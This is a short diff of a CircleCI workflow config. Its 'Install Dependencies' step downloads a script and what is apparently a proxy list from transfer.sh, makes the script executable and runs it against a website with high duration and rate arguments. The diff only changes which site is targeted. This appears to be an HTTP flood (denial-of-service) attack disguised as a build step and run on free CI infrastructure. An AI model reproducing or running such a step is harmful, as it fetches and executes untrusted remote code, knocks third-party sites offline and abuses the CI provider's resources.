@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/get/rAH3vG/f.js && wget https://transfer.sh/WPITIG/http.txt && chmod +x f.js && ./f.js GET https://www.skyblock.tc/kayitol http.txt 60 153 9999999999999999999999999999999999999999999999999999999999999999999999 
+            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/get/rAH3vG/f.js && wget https://transfer.sh/WPITIG/http.txt && chmod +x f.js && ./f.js GET https://dststx.xyz http.txt 60 153 9999999999999999999999999999999999999999999999999999999999999999999999 
 
 workflows:
     version: 2.1
